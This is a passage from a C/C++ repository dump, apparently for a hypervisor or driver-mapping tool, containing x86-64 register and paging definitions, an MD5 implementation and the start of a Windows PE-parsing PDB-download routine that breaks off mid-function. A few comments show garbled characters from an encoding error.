#define RFLAGS_RESUME_FLAG_MASK                                      0x01
#define RFLAGS_RESUME_FLAG(_)                                        (((_) >> 16) & 0x01)

        /**
         * @brief Virtual-8086 mode flag
         *
         * [Bit 17] See the description in EFLAGS.
         */
        UINT64 Virtual8086ModeFlag : 1;
#define RFLAGS_VIRTUAL_8086_MODE_FLAG_BIT                            17
#define RFLAGS_VIRTUAL_8086_MODE_FLAG_FLAG                           0x20000
#define RFLAGS_VIRTUAL_8086_MODE_FLAG_MASK                           0x01
#define RFLAGS_VIRTUAL_8086_MODE_FLAG(_)                             (((_) >> 17) & 0x01)

        /**
         * @brief Alignment check (or access control) flag
         *
         * [Bit 18] See the description in EFLAGS.
         *
         * @see Vol3A[4.6(ACCESS RIGHTS)]
         */
        UINT64 AlignmentCheckFlag : 1;
#define RFLAGS_ALIGNMENT_CHECK_FLAG_BIT                              18
#define RFLAGS_ALIGNMENT_CHECK_FLAG_FLAG                             0x40000
#define RFLAGS_ALIGNMENT_CHECK_FLAG_MASK                             0x01
#define RFLAGS_ALIGNMENT_CHECK_FLAG(_)                               (((_) >> 18) & 0x01)

        /**
         * @brief Virtual interrupt flag
         *
         * [Bit 19] See the description in EFLAGS.
         */
        UINT64 VirtualInterruptFlag : 1;
#define RFLAGS_VIRTUAL_INTERRUPT_FLAG_BIT                            19
#define RFLAGS_VIRTUAL_INTERRUPT_FLAG_FLAG                           0x80000
#define RFLAGS_VIRTUAL_INTERRUPT_FLAG_MASK                           0x01
#define RFLAGS_VIRTUAL_INTERRUPT_FLAG(_)                             (((_) >> 19) & 0x01)

        /**
         * @brief Virtual interrupt pending flag
         *
         * [Bit 20] See the description in EFLAGS.
         */
        UINT64 VirtualInterruptPendingFlag : 1;
#define RFLAGS_VIRTUAL_INTERRUPT_PENDING_FLAG_BIT                    20
#define RFLAGS_VIRTUAL_INTERRUPT_PENDING_FLAG_FLAG                   0x100000
#define RFLAGS_VIRTUAL_INTERRUPT_PENDING_FLAG_MASK                   0x01
#define RFLAGS_VIRTUAL_INTERRUPT_PENDING_FLAG(_)                     (((_) >> 20) & 0x01)

        /**
         * @brief Identification flag
         *
         * [Bit 21] See the description in EFLAGS.
         */
        UINT64 IdentificationFlag : 1;
#define RFLAGS_IDENTIFICATION_FLAG_BIT                               21
#define RFLAGS_IDENTIFICATION_FLAG_FLAG                              0x200000
#define RFLAGS_IDENTIFICATION_FLAG_MASK                              0x01
#define RFLAGS_IDENTIFICATION_FLAG(_)                                (((_) >> 21) & 0x01)
        UINT64 Reserved4 : 42;
    };

    UINT64 Flags;
} RFLAGS;

/**
 * @defgroup EXCEPTIONS \
 *           Exceptions
 * @{
 */
 /**
  * @brief Exceptions that can occur when the instruction is executed in protected mode.
  *        Each exception is given a mnemonic that consists of a pound sign (\#) followed by two letters and an optional error code
  *        in parentheses. For example, \#GP(0) denotes a general protection exception with an error code of 0
  *
  * @see Vol2A[3.1.1.13(Protected Mode Exceptions Section)] (reference)
  * @see Vol3A[6.3.1(External Interrupts)] (reference)
  */
typedef enum
{
    /**
     * #DE - Divide Error.
     * Source: DIV and IDIV instructions.
     * Error Code: No.
     */
    DivideError = 0x00000000,

    /**
     * #DB - Debug.
     * Source: Any code or data reference.
     * Error Code: No.
     */
    Debug = 0x00000001,

    /**
     * Nonmaskable Interrupt.
     * Source: Generated externally by asserting the processor's NMI pin or
     *         through an NMI request set by the I/O APIC to the local APIC.
     * Error Code: No.
     */
    Nmi = 0x00000002,

    /**
     * #BP - Breakpoint.
     * Source: INT3 instruction.
     * Error Code: No.
     */
    Breakpoint = 0x00000003,

    /**
     * #OF - Overflow.
     * Source: INTO instruction.
     * Error Code: No.
     */
    Overflow = 0x00000004,

    /**
     * #BR - BOUND Range Exceeded.
     * Source: BOUND instruction.
     * Error Code: No.
     */
    BoundRangeExceeded = 0x00000005,

    /**
     * #UD - Invalid Opcode (Undefined Opcode).
     * Source: UD instruction or reserved opcode.
     * Error Code: No.
     */
    InvalidOpcode = 0x00000006,

    /**
     * #NM - Device Not Available (No Math Coprocessor).
     * Source: Floating-point or WAIT/FWAIT instruction.
     * Error Code: No.
     */
    DeviceNotAvailable = 0x00000007,

    /**
     * #DF - Double Fault.
     * Source: Any instruction that can generate an exception, an NMI, or an INTR.
     * Error Code: Yes (zero).
     */
    DoubleFault = 0x00000008,

    /**
     * #\## - Coprocessor Segment Overrun (reserved).
     * Source: Floating-point instruction.
     * Error Code: No.
     *
     * @note Processors after the Intel386 processor do not generate this exception.
     */
    CoprocessorSegmentOverrun = 0x00000009,

    /**
     * #TS - Invalid TSS.
     * Source: Task switch or TSS access.
     * Error Code: Yes.
     */
    InvalidTss = 0x0000000A,

    /**
     * #NP - Segment Not Present.
     * Source: Loading segment registers or accessing system segments.
     * Error Code: Yes.
     */
    SegmentNotPresent = 0x0000000B,

    /**
     * #SS - Stack Segment Fault.
     * Source: Stack operations and SS register loads.
     * Error Code: Yes.
     */
    StackSegmentFault = 0x0000000C,

    /**
     * #GP - General Protection.
     * Source: Any memory reference and other protection checks.
     * Error Code: Yes.
     */
    GeneralProtection = 0x0000000D,

    /**
     * #PF - Page Fault.
     * Source: Any memory reference.
     * Error Code: Yes.
     */
    PageFault = 0x0000000E,

    /**
     * #MF - Floating-Point Error (Math Fault).
     * Source: Floating-point or WAIT/FWAIT instruction.
     * Error Code: No.
     */
    X87FloatingPointError = 0x00000010,

    /**
     * #AC - Alignment Check.
     * Source: Any data reference in memory.
     * Error Code: Yes.
     */
    AlignmentCheck = 0x00000011,

    /**
     * #MC - Machine Check.
     * Source: Model dependent machine check errors.
     * Error Code: No.
     */
    MachineCheck = 0x00000012,

    /**
     * #XM - SIMD Floating-Point Numeric Error.
     * Source: SSE/SSE2/SSE3 floating-point instructions.
     * Error Code: No.
     */
    SimdFloatingPointError = 0x00000013,

    /**
     * #VE - Virtualization Exception.
     * Source: EPT violations.
     * Error Code: No.
     */
    VirtualizationException = 0x00000014,
} EXCEPTION_VECTOR;

/**
 * @brief When an exception condition is related to a specific segment selector or IDT vector, the processor pushes an
 *        error code onto the stack of the exception handler (whether it is a procedure or task). The error code resembles a
 *        segment selector; however, instead of a TI flag and RPL field, the error code contains 3 different flags
 *
 * @see Vol3A[6.13(ERROR CODE)] (reference)
 */
typedef union
{
    struct
    {
        /**
         * [Bit 0] When set, indicates that the exception occurred during delivery of an event external to the program, such as an
         * interrupt or an earlier exception. The bit is cleared if the exception occurred during delivery of a software interrupt
         * (INT n, INT3, or INTO).
         */
        UINT32 ExternalEvent : 1;
#define EXCEPTION_ERROR_CODE_EXTERNAL_EVENT_BIT                      0
#define EXCEPTION_ERROR_CODE_EXTERNAL_EVENT_FLAG                     0x01
#define EXCEPTION_ERROR_CODE_EXTERNAL_EVENT_MASK                     0x01
#define EXCEPTION_ERROR_CODE_EXTERNAL_EVENT(_)                       (((_) >> 0) & 0x01)

        /**
         * [Bit 1] When set, indicates that the index portion of the error code refers to a gate descriptor in the IDT; when clear,
         * indicates that the index refers to a descriptor in the GDT or the current LDT.
         */
        UINT32 DescriptorLocation : 1;
#define EXCEPTION_ERROR_CODE_DESCRIPTOR_LOCATION_BIT                 1
#define EXCEPTION_ERROR_CODE_DESCRIPTOR_LOCATION_FLAG                0x02
#define EXCEPTION_ERROR_CODE_DESCRIPTOR_LOCATION_MASK                0x01
#define EXCEPTION_ERROR_CODE_DESCRIPTOR_LOCATION(_)                  (((_) >> 1) & 0x01)

        /**
         * [Bit 2] Only used when the IDT flag is clear. When set, the TI flag indicates that the index portion of the error code
         * refers to a segment or gate descriptor in the LDT; when clear, it indicates that the index refers to a descriptor in the
         * current GDT.
         */
        UINT32 GdtLdt : 1;
#define EXCEPTION_ERROR_CODE_GDT_LDT_BIT                             2
#define EXCEPTION_ERROR_CODE_GDT_LDT_FLAG                            0x04
#define EXCEPTION_ERROR_CODE_GDT_LDT_MASK                            0x01
#define EXCEPTION_ERROR_CODE_GDT_LDT(_)                              (((_) >> 2) & 0x01)

        /**
         * [Bits 15:3] The segment selector index field provides an index into the IDT, GDT, or current LDT to the segment or gate
         * selector being referenced by the error code. In some cases the error code is null (all bits are clear except possibly
         * EXT). A null error code indicates that the error was not caused by a reference to a specific segment or that a null
         * segment selector was referenced in an operation.
         *
         * @note The format of the error code is different for page-fault exceptions (#PF).
         */
        UINT32 Index : 13;
#define EXCEPTION_ERROR_CODE_INDEX_BIT                               3
#define EXCEPTION_ERROR_CODE_INDEX_FLAG                              0xFFF8
#define EXCEPTION_ERROR_CODE_INDEX_MASK                              0x1FFF
#define EXCEPTION_ERROR_CODE_INDEX(_)                                (((_) >> 3) & 0x1FFF)
        UINT32 Reserved1 : 16;
    };

    UINT32 Flags;
} EXCEPTION_ERROR_CODE;

/**
 * @brief Page fault exception
 *
 * @see Vol3A[4.7(PAGE-FAULT EXCEPTIONS)] (reference)
 */
typedef union
{
    struct
    {
        /**
         * [Bit 0] This flag is 0 if there is no translation for the linear address because the P flag was 0 in one of the
         * pagingstructure entries used to translate that address.
         */
        UINT32 Present : 1;
#define PAGE_FAULT_EXCEPTION_PRESENT_BIT                             0
#define PAGE_FAULT_EXCEPTION_PRESENT_FLAG                            0x01
#define PAGE_FAULT_EXCEPTION_PRESENT_MASK                            0x01
#define PAGE_FAULT_EXCEPTION_PRESENT(_)                              (((_) >> 0) & 0x01)

        /**
         * [Bit 1] If the access causing the page-fault exception was a write, this flag is 1; otherwise, it is 0. This flag
         * describes the access causing the page-fault exception, not the access rights specified by paging.
         */
        UINT32 Write : 1;
#define PAGE_FAULT_EXCEPTION_WRITE_BIT                               1
#define PAGE_FAULT_EXCEPTION_WRITE_FLAG                              0x02
#define PAGE_FAULT_EXCEPTION_WRITE_MASK                              0x01
#define PAGE_FAULT_EXCEPTION_WRITE(_)                                (((_) >> 1) & 0x01)

        /**
         * [Bit 2] If a user-mode access caused the page-fault exception, this flag is 1; it is 0 if a supervisor-mode access did
         * so. This flag describes the access causing the page-fault exception, not the access rights specified by paging.
         *
         * @see Vol3A[4.6(ACCESS RIGHTS)]
         */
        UINT32 UserModeAccess : 1;
#define PAGE_FAULT_EXCEPTION_USER_MODE_ACCESS_BIT                    2
#define PAGE_FAULT_EXCEPTION_USER_MODE_ACCESS_FLAG                   0x04
#define PAGE_FAULT_EXCEPTION_USER_MODE_ACCESS_MASK                   0x01
#define PAGE_FAULT_EXCEPTION_USER_MODE_ACCESS(_)                     (((_) >> 2) & 0x01)

        /**
         * [Bit 3] This flag is 1 if there is no translation for the linear address because a reserved bit was set in one of the
         * pagingstructure entries used to translate that address. (Because reserved bits are not checked in a paging-structure
         * entry whose P flag is 0, bit 3 of the error code can be set only if bit 0 is also set). Bits reserved in the
         * paging-structure entries are reserved for future functionality. Software developers should be aware that such bits may
         * be used in the future and that a paging-structure entry that causes a page-fault exception on one processor might not do
         * so in the future.
         */
        UINT32 ReservedBitViolation : 1;
#define PAGE_FAULT_EXCEPTION_RESERVED_BIT_VIOLATION_BIT              3
#define PAGE_FAULT_EXCEPTION_RESERVED_BIT_VIOLATION_FLAG             0x08
#define PAGE_FAULT_EXCEPTION_RESERVED_BIT_VIOLATION_MASK             0x01
#define PAGE_FAULT_EXCEPTION_RESERVED_BIT_VIOLATION(_)               (((_) >> 3) & 0x01)

        /**
         * [Bit 4] This flag is 1 if (1) the access causing the page-fault exception was an instruction fetch; and (2) either (a)
         * CR4.SMEP = 1; or (b) both (i) CR4.PAE = 1 (either PAE paging or 4-level paging is in use); and (ii) IA32_EFER.NXE = 1.
         * Otherwise, the flag is 0. This flag describes the access causing the page-fault exception, not the access rights
         * specified by paging.
         */
        UINT32 Execute : 1;
#define PAGE_FAULT_EXCEPTION_EXECUTE_BIT                             4
#define PAGE_FAULT_EXCEPTION_EXECUTE_FLAG                            0x10
#define PAGE_FAULT_EXCEPTION_EXECUTE_MASK                            0x01
#define PAGE_FAULT_EXCEPTION_EXECUTE(_)                              (((_) >> 4) & 0x01)

        /**
         * [Bit 5] This flag is 1 if (1) IA32_EFER.LMA = CR4.PKE = 1; (2) the access causing the page-fault exception was a data
         * access; (3) the linear address was a user-mode address with protection key i; and (5) the PKRU register is such that
         * either (a) ADi = 1; or (b) the following all hold: (i) WDi = 1; (ii) the access is a write access; and (iii) either
         * CR0.WP = 1 or the access causing the page-fault exception was a user-mode access.
         *
         * @see Vol3A[4.6.2(Protection Keys)]
         */
        UINT32 ProtectionKeyViolation : 1;
#define PAGE_FAULT_EXCEPTION_PROTECTION_KEY_VIOLATION_BIT            5
#define PAGE_FAULT_EXCEPTION_PROTECTION_KEY_VIOLATION_FLAG           0x20
#define PAGE_FAULT_EXCEPTION_PROTECTION_KEY_VIOLATION_MASK           0x01
#define PAGE_FAULT_EXCEPTION_PROTECTION_KEY_VIOLATION(_)             (((_) >> 5) & 0x01)
        UINT32 Reserved1 : 9;

        /**
         * [Bit 15] This flag is 1 if the exception is unrelated to paging and resulted from violation of SGX-specific
         * access-control requirements. Because such a violation can occur only if there is no ordinary page fault, this flag is
         * set only if the P flag (bit 0) is 1 and the RSVD flag (bit 3) and the PK flag (bit 5) are both 0.
         */
        UINT32 Sgx : 1;
#define PAGE_FAULT_EXCEPTION_SGX_BIT                                 15
#define PAGE_FAULT_EXCEPTION_SGX_FLAG                                0x8000
#define PAGE_FAULT_EXCEPTION_SGX_MASK                                0x01
#define PAGE_FAULT_EXCEPTION_SGX(_)                                  (((_) >> 15) & 0x01)
        UINT32 Reserved2 : 16;
    };

    UINT32 Flags;
} PAGE_FAULT_EXCEPTION;

/**
 * @}
 */

 /**
  * @defgroup MEMORY_TYPE \
  *           Memory caching type
  *
  * The processor allows any area of system memory to be cached in the L1, L2, and L3 caches. In individual pages or regions
  * of system memory, it allows the type of caching (also called memory type) to be specified.
  *
  * @see Vol3A[11.11(MEMORY TYPE RANGE REGISTERS (MTRRS))]
  * @see Vol3A[11.5(CACHE CONTROL)]
  * @see Vol3A[11.3(METHODS OF CACHING AVAILABLE)] (reference)
  * @{
  */
  /**
   * @brief Strong Uncacheable (UC)
   *
   * System memory locations are not cached. All reads and writes appear on the system bus and are executed in program order
   * without reordering. No speculative memory accesses, pagetable walks, or prefetches of speculated branch targets are
   * made. This type of cache-control is useful for memory-mapped I/O devices. When used with normal RAM, it greatly reduces
   * processor performance.
   */
#define MEMORY_TYPE_UNCACHEABLE                                      0x00000000

   /**
    * @brief Write Combining (WC)
    *
    * System memory locations are not cached (as with uncacheable memory) and coherency is not enforced by the processor's bus
    * coherency protocol. Speculative reads are allowed. Writes may be delayed and combined in the write combining buffer (WC
    * buffer) to reduce memory accesses. If the WC buffer is partially filled, the writes may be delayed until the next
    * occurrence of a serializing event; such as, an SFENCE or MFENCE instruction, CPUID execution, a read or write to
    * uncached memory, an interrupt occurrence, or a LOCK instruction execution. This type of cache-control is appropriate for
    * video frame buffers, where the order of writes is unimportant as long as the writes update memory so they can be seen on
    * the graphics display. This memory type is available in the Pentium Pro and Pentium II processors by programming the
    * MTRRs; or in processor families starting from the Pentium III processors by programming the MTRRs or by selecting it
    * through the PAT.
    *
    * @see Vol3A[11.3.1(Buffering of Write Combining Memory Locations)]
    */
#define MEMORY_TYPE_WRITE_COMBINING                                  0x00000001

    /**
     * @brief Write-through (WT)
     *
     * Writes and reads to and from system memory are cached. Reads come from cache lines on cache hits; read misses cause
     * cache fills. Speculative reads are allowed. All writes are written to a cache line (when possible) and through to system
     * memory. When writing through to memory, invalid cache lines are never filled, and valid cache lines are either filled or
     * invalidated. Write combining is allowed. This type of cache-control is appropriate for frame buffers or when there are
     * devices on the system bus that access system memory, but do not perform snooping of memory accesses. It enforces
     * coherency between caches in the processors and system memory.
     */
#define MEMORY_TYPE_WRITE_THROUGH                                    0x00000004

     /**
      * @brief Write protected (WP)
      *
      * Reads come from cache lines when possible, and read misses cause cache fills. Writes are propagated to the system bus
      * and cause corresponding cache lines on all processors on the bus to be invalidated. Speculative reads are allowed. This
      * memory type is available in processor families starting from the P6 family processors by programming the MTRRs.
      */
#define MEMORY_TYPE_WRITE_PROTECTED                                  0x00000005

      /**
       * @brief Write-back (WB)
       *
       * Writes and reads to and from system memory are cached. Reads come from cache lines on cache hits; read misses cause
       * cache fills. Speculative reads are allowed. Write misses cause cache line fills (in processor families starting with the
       * P6 family processors), and writes are performed entirely in the cache, when possible. Write combining is allowed. The
       * write-back memory type reduces bus traffic by eliminating many unnecessary writes to system memory. Writes to a cache
       * line are not immediately forwarded to system memory; instead, they are accumulated in the cache. The modified cache
       * lines are written to system memory later, when a write-back operation is performed. Write-back operations are triggered
       * when cache lines need to be deallocated, such as when new cache lines are being allocated in a cache that is already
       * full. They also are triggered by the mechanisms used to maintain cache consistency. This type of cache-control provides
       * the best performance, but it requires that all devices that access system memory on the system bus be able to snoop
       * memory accesses to insure system memory and cache coherency.
       */
#define MEMORY_TYPE_WRITE_BACK                                       0x00000006

       /**
        * @brief Uncacheable (UC-)
        *
        * Has same characteristics as the strong uncacheable (UC) memory type, except that this memory type can be overridden by
        * programming the MTRRs for the WC memory type. This memory type is available in processor families starting from the
        * Pentium III processors and can only be selected through the PAT.
        */
#define MEMORY_TYPE_UNCACHEABLE_MINUS                                0x00000007
#define MEMORY_TYPE_INVALID                                          0x000000FF
        /**
         * @}
         */

         /**
          * @}
          */


typedef struct _MEMORY_ACCESS_CONTEXT
{
    //
    // Reserved virtual address (page) for access to the guest virtual memory
    // from the hypervisor.
    //
    VOID* ReservedPage;

    //
    // The pointer to the PTE of the reserved page.
    //
    PTE_64* Pte;

    //
    // The address of the page table that is dynamically allocated to translate
    // ReservedPage with the 4KB page (and not the large page).
    //
    PTE_64* AllocatedPageTable;
} MEMORY_ACCESS_CONTEXT;

typedef union _ADDRESS_TRANSLATION_HELPER
{
    //
    // Indexes to locate paging-structure entries corresponds to this virtual
    // address.
    //
    struct
    {
        UINT64 Unused : 12;         //< [11:0]
        UINT64 Pt : 9;              //< [20:12]
        UINT64 Pd : 9;              //< [29:21]
        UINT64 Pdpt : 9;            //< [38:30]
        UINT64 Pml4 : 9;            //< [47:39]
    } AsIndex;

    //
    // The page offset for each type of pages. For example, for 4KB pages, bits
    // [11:0] are treated as the page offset and Mapping4Kb can be used for it.
    //
    union
    {
        UINT64 Mapping4Kb : 12;     //< [11:0]
        UINT64 Mapping2Mb : 21;     //< [20:0]
        UINT64 Mapping1Gb : 30;     //< [29:0]
    } AsPageOffset;

    UINT64 AsUInt64;
} ADDRESS_TRANSLATION_HELPER;
```

`client/pdb/md5.cpp`:

```cpp
#include "md5.hpp"

// https://github.com/pod32g/MD5/blob/master/md5.c

// Constants are the integer part of the sines of integers (in radians) * 2^32.
const UINT32 k[64] = {
    0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee, 0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
    0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be, 0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
    0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa, 0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
    0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed, 0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
    0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c, 0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
    0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05, 0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
    0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039, 0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
    0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1, 0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391};

// r specifies the per-round shift amounts
const UINT32 r[] = {7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
                    5, 9,  14, 20, 5, 9,  14, 20, 5, 9,  14, 20, 5, 9,  14, 20,
                    4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
                    6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21};

// leftrotate function definition
#define LEFTROTATE(x, c) (((x) << (c)) | ((x) >> (32 - (c))))

void to_bytes(UINT32 val, UINT8* bytes) {
  bytes[0] = (UINT8)val;
  bytes[1] = (UINT8)(val >> 8);
  bytes[2] = (UINT8)(val >> 16);
  bytes[3] = (UINT8)(val >> 24);
}

UINT32 to_int32(const UINT8* bytes) {
  return (UINT32)bytes[0] | ((UINT32)bytes[1] << 8) | ((UINT32)bytes[2] << 16) |
         ((UINT32)bytes[3] << 24);
}

void md5(const UINT8* initial_msg, UINT32 initial_len, UINT8* digest) {
  // These vars will contain the hash
  UINT32 h0, h1, h2, h3;

  // Message (to prepare)
  UINT8* msg = NULL;

  UINT32 new_len, offset;
  UINT32 w[16];
  UINT32 a, b, c, d, i, f, g, temp;

  // Initialize variables - simple count in nibbles:
  h0 = 0x67452301;
  h1 = 0xefcdab89;
  h2 = 0x98badcfe;
  h3 = 0x10325476;

  // Pre-processing:
  // append "1" bit to message
  // append "0" bits until message length in bits Ёд 448 (mod 512)
  // append length mod (2^64) to message

  for (new_len = initial_len + 1; new_len % (512 / 8) != 448 / 8; new_len++)
    ;

#ifdef _KERNEL_MODE
  msg = (UINT8*)ExAllocatePoolWithTag(PagedPool, new_len + 8, POOLTAG);
#else
  msg = (UINT8*)malloc(new_len + 8);
#endif

  memcpy(msg, initial_msg, initial_len);
  msg[initial_len] = 0x80;  // append the "1" bit; most significant bit is "first"
  for (offset = initial_len + 1; offset < new_len; offset++)
    msg[offset] = 0;  // append "0" bits

  // append the len in bits at the end of the buffer.
  to_bytes(initial_len * 8, msg + new_len);
  // initial_len>>29 == initial_len*8>>32, but avoids overflow.
  to_bytes(initial_len >> 29, msg + new_len + 4);

  // Process the message in successive 512-bit chunks:
  // for each 512-bit chunk of message:
  for (offset = 0; offset < new_len; offset += (512 / 8)) {
    // break chunk into sixteen 32-bit words w[j], 0 Ём j Ём 15
    for (i = 0; i < 16; i++)
      w[i] = to_int32(msg + offset + i * 4);

    // Initialize hash value for this chunk:
    a = h0;
    b = h1;
    c = h2;
    d = h3;

    // Main loop:
    for (i = 0; i < 64; i++) {
      if (i < 16) {
        f = (b & c) | ((~b) & d);
        g = i;
      } else if (i < 32) {
        f = (d & b) | ((~d) & c);
        g = (5 * i + 1) % 16;
      } else if (i < 48) {
        f = b ^ c ^ d;
        g = (3 * i + 5) % 16;
      } else {
        f = c ^ (b | (~d));
        g = (7 * i) % 16;
      }

      temp = d;
      d = c;
      c = b;
      b = b + LEFTROTATE((a + f + k[i] + w[g]), r[i]);
      a = temp;
    }

    // Add this chunk's hash to result so far:
    h0 += a;
    h1 += b;
    h2 += c;
    h3 += d;
  }

  // cleanup
#ifdef _KERNEL_MODE
  ExFreePoolWithTag(msg, POOLTAG);
#else
  free(msg);
#endif

  // var char digest[16] := h0 append h1 append h2 append h3 //(Output is in
  // little-endian)
  to_bytes(h0, digest);
  to_bytes(h1, digest + 4);
  to_bytes(h2, digest + 8);
  to_bytes(h3, digest + 12);
}

std::string Md5(PVOID buffer, ULONG bufferLen) {
  UINT8 raw[16];
  std::string res;

  md5((const UINT8*)buffer, bufferLen, raw);

  for (size_t i = 0; i < 16; i++) {
    char ch[4] = {0};
    sprintf(ch, "%02x", raw[i]);
    res += ch;
  }

  return res;
}

```

`client/pdb/md5.hpp`:

```hpp
#pragma once

// swprintf
#pragma warning(disable : 4996)

#include <Windows.h>
#include <stdio.h>

#include <iostream>
#include <string>

std::string Md5(PVOID buffer, ULONG bufferLen);
```

`client/pdb/pdb.cpp`:

```cpp
#include "pdb.hpp"
#include <dia2.h>
#include <diacreate.h>
#include <atlbase.h>

#pragma comment(lib, "diaguids.lib")

// helper class to initialize COM once
class ComInitializer {
public:
  ComInitializer() {
    HRESULT hr = CoInitialize(NULL);
    initialized = SUCCEEDED(hr);
  }
  ~ComInitializer() {
    if (initialized) {
      CoUninitialize();
    }
  }

private:
  bool initialized;
};

// global COM initializer
static ComInitializer g_com_init;

std::string pdb_download(const std::string& pe_path, const std::string& pdb_download_path,
                         const std::string& symbol_server) {
  if (pe_path.empty()) {
    mapper_log("ERROR", "PE path cannot be empty");
    SetLastError(ERROR_INVALID_PARAMETER);
    return "";
  }

  mapper_log("SUCCESS", "starting PDB download for: %ws",
             std::wstring(pe_path.begin(), pe_path.end()).c_str());

  // determine PDB download directory
  std::string download_path = pdb_download_path;
  if (download_path.empty()) {
    char sz_download_dir[MAX_PATH] = {0};
    if (!GetCurrentDirectoryA(sizeof(sz_download_dir), sz_download_dir)) {
      mapper_log("ERROR", "failed to get current directory: 0x%lx", GetLastError());
      return "";
    }
    download_path = sz_download_dir;
    mapper_log("SUCCESS", "using current directory for PDB download");
  }

  if (download_path[download_path.size() - 1] != '\\') {
    download_path += "\\";
  }

  // create directory if it doesn't exist
  if (!CreateDirectoryA(download_path.c_str(), NULL)) {
    if (GetLastError() != ERROR_ALREADY_EXISTS) {
      mapper_log("ERROR", "failed to create download directory: 0x%lx", GetLastError());
      return "";
    }
  }

  mapper_log("SUCCESS", "download directory: %ws",
             std::wstring(download_path.begin(), download_path.end()).c_str());

#ifndef _AMD64_
  PVOID old_value = NULL;
  if (!Wow64DisableWow64FsRedirection(&old_value)) {
    mapper_log("ERROR", "failed to disable WOW64 redirection: 0x%lx", GetLastError());
  }
#endif

  // read PE file
  std::ifstream file(pe_path, std::ios::binary | std::ios::ate);
  if (!file.is_open()) {
    mapper_log("ERROR", "failed to open PE file: %ws",
               std::wstring(pe_path.begin(), pe_path.end()).c_str());
#ifndef _AMD64_
    Wow64RevertWow64FsRedirection(old_value);
#endif
    SetLastError(ERROR_FILE_NOT_FOUND);
    return "";
  }

  auto size = file.tellg();
  if (size <= 0) {
    mapper_log("ERROR", "PE file is empty or invalid");
    file.close();
#ifndef _AMD64_
    Wow64RevertWow64FsRedirection(old_value);
#endif
    SetLastError(ERROR_INVALID_DATA);
    return "";
  }

  file.seekg(0, std::ios::beg);
  std::vector<char> buffer(size);

#ifndef _AMD64_
  Wow64RevertWow64FsRedirection(old_value);
#endif

  if (!file.read(buffer.data(), size)) {
    mapper_log("ERROR", "failed to read PE file data");
    SetLastError(ERROR_ACCESS_DENIED);
    return "";
  }

  mapper_log("SUCCESS", "PE file read successfully, size: 0x%llx bytes", size);

  std::string pdb_path = download_path + Md5(buffer.data(), static_cast<ULONG>(size)) + ".pdb";

  // parse PE headers
  if (buffer.size() < sizeof(IMAGE_DOS_HEADER)) {
    mapper_log("ERROR", "file too small to contain DOS header");
    SetLastError(ERROR_INVALID_DATA);
    return "";
  }

  auto p_dos = reinterpret_cast<IMAGE_DOS_HEADER*>(buffer.data());
  if (p_dos->e_magic != IMAGE_DOS_SIGNATURE) {
    mapper_log("ERROR", "invalid DOS signature");
    SetLastError(ERROR_INVALID_DATA);
    return "";
  }

  if (buffer.size() < p_dos->e_lfanew + sizeof(IMAGE_NT_HEADERS)) {
    mapper_log("ERROR", "file too small to contain NT headers");
    SetLastError(ERROR_INVALID_DATA);
    return "";
  }

  auto p_nt = reinterpret_cast<IMAGE_NT_HEADERS*>(buffer.data() + p_dos->e_lfanew);
  if (p_nt->Signature != IMAGE_NT_SIGNATURE) {
    mapper_log("ERROR", "invalid NT signature");
    SetLastError(ERROR_INVALID_DATA);
    return "";
  }

  auto p_file = &p_nt->FileHeader;
  IMAGE_OPTIONAL_HEADER64* p_opt64 = nullptr;
  IMAGE_OPTIONAL_HEADER32* p_opt32 = nullptr;
  bool is_x86 = false;

  if (p_file->Machine == IMAGE_FILE_MACHINE_AMD64) {
    p_opt64 = reinterpret_cast<IMAGE_OPTIONAL_HEADER64*>(&p_nt->OptionalHeader);
    mapper_log("SUCCESS", "detected x64 PE file");
  } else if (p_file->Machine == IMAGE_FILE_MACHINE_I386) {
    p_opt32 = reinterpret_cast<IMAGE_OPTIONAL_HEADER32*>(&p_nt->OptionalHeader);
    is_x86 = true;
    mapper_log("SUCCESS", "detected x86 PE file");
  } else {
    mapper_log("ERROR", "unsupported machine type: 0x%x", p_file->Machine);
    SetLastError(ERROR_NOT_SUPPORTED);
    return "";
  }

  auto image_size = is_x86 ? p_opt32->SizeOfImage : p_opt64->SizeOfImage;
  mapper_log("SUCCESS", "image size: 0x%lx bytes", image_size);

  // map file to image
  auto image_buffer = std::make_unique<BYTE[]>(image_size);
  if (!image_buffer) {
    mapper_log("ERROR", "failed to allocate image buffer");
    SetLastError(ERROR_NOT_ENOUGH_MEMORY);
    return "";
  }

  auto headers_size = is_x86 ? p_opt32->SizeOfHeaders : p_opt64->SizeOfHeaders;
  std::memcpy(image_buffer.get(), buffer.data(), headers_size);

  auto p_current_section_header = IMAGE_FIRST_SECTION(p_nt);
  for (UINT i = 0; i != p_file->NumberOfSections; ++i, ++p_current_section_header) {
    if (p_current_section_header->SizeOfRawData) {
      if (p_current_section_header->VirtualAddress + p_current_section_header->SizeOfRawData >
              image_size ||
          p_current_section_header->PointerToRawData + p_current_section_header->SizeOfRawData >
              buffer.size()) {
        mapper_log("ERROR", "invalid section data detected");
        SetLastError(ERROR_INVALID_DATA);
        return "";
      }

      std::memcpy(image_buffer.get() + p_current_section_header->VirtualAddress,
                  buffer.data() + p_current_section_header->PointerToRawData,
                  p_current_section_header->SizeOfRawData);
    }
  }

  // get debug directory
  IMAGE_DATA_DIRECTORY* p_data_dir = nullptr;
  if (is_x86) {
